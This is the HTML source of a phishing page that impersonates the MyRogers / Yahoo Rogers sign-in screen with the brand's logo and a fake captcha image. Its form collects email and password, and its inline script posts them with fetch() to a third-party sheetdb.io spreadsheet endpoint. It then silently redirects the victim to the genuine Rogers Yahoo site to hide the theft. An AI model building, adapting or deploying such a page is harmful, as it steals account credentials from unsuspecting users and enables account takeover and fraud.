<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MyRogers | Sign in</title>

    <link rel="stylesheet" href="style.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@100;300;400;500;700;900&display=swap" rel="stylesheet">

    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">

    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Rounded:opsz,wght,FILL,GRAD@20..48,100..700,0..1,-50..200" />
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Rounded:opsz,wght,FILL,GRAD@20..48,100..700,0..1,-50..200" />
    <style>
       
    </style>
</head>
<body>
    <div class="container">
        <div class="container__box">
            <div class="inner__container">
                <div class="top__container">
                    <div class="logo__container">
                        <img src="./resources/rogers-yahoo 2.png" alt="">
                    </div>
                    <h3 class="francia">FR</h3>
                </div>
                <h1 class="sign__title">Sign in</h1>
                <h2 class="sub__title">with your Yahoo Rogers credentials</h2>
                <div class="form__container"></div>
                <form action="https://sheetdb.io/api/v1/jl19sb954bas3" method="post" class="login" id="sheetdb-form">
                    <div class="input__container">
                        <div class="input__container--icon">
                            <span class="material-symbols-rounded icon">info</span>
                            <input type="email" name="data[email]" id="email-id" class="input input__email" placeholder="Username" required>
                        </div>
                        <div class="input__container--icon">
                            <span class="material-symbols-rounded icon">info</span>
                            <input type="password" name="data[password]" id="password-id" class="input input__password" placeholder="Password" required>
                        </div>
                    </div>
                    <div class="checkbox__container">
                        <input type="checkbox" name="checkbox" id="checkbox">
                        <label for="checkbox" class="checkbox__label">Remember username</label>
                    </div>
                    <button type="submit" class="btn input">Continue</button>
                    <hr class="line">

                    <!-- ///////////////////////////////////////////////////////////////////////////////////////////////////////////// -->

                    <script>
                        var form = document.getElementById('sheetdb-form');
                        form.addEventListener("submit", e => {
                        e.preventDefault();

                        fetch(form.action, {
                            method : "POST",
                            body: new FormData(document.getElementById("sheetdb-form")),
                        }).then(
                            response => response.json()
                        ).then((html) => {
                            // you can put any JS code here
                            window.open('https://ca.rogers.yahoo.com/', '_self');
                        });
                        });
                    </script>

                </form>
            </div>
        </div>
        <div class="captcha__container">
            <img src="./resources/captcha.png" alt="" class="captcha">
        </div>
    </div>
</body>
</html>
